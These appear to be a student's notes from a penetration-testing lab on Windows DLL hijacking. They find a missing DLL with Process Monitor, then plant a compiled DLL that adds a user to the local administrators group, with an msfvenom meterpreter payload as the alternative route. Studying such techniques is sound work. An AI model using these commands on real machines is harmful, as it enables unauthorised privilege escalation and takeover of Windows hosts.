DLL -> Dynamic Link Library 
just like an executable 

1) Go the windowa machine
2)  open tools 
3) then the process monitor run procmon as admin
4) then  using ctrl+f open the filter add the following filters
	1) Result is name not found
	![[DLL-Hijacking-1.png]]
	2) Path ends with .dll
	![[DLL-Hijacking-2.png]]

5) then apply then ok 
6) open cmd 
7) type `sc start dllsvc`
8) then type `sc stop dllsvc`
9) repeat step 7 
10) we can now a see in `c:\temp\hijackme.dll`
	1) as shown below
		1) ![[dll-hijaking-3.png]]

11) to exploit the sevice we can use 2 ways 
	1) 1st way is use a msfvenom payload the normal meterpreter ones 
	2) 2nd ways is to add the user to administrators and increase our privs
	for the 1st one follow the executables path shown in module 13 replace exe with dll


2nd path is 

1) get windows_dll.c in our machine
2) change the system to `cmd.exe /k net localgroup administrators user /add` user here the computer user change the `user` to whom you want elevate the privs
3) compile it using `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`
4) transfer the exploit to the above path in `C:\temp`
5) restart the service using `sc stop dllsvc`  , `sc start dllsvc`
6) done
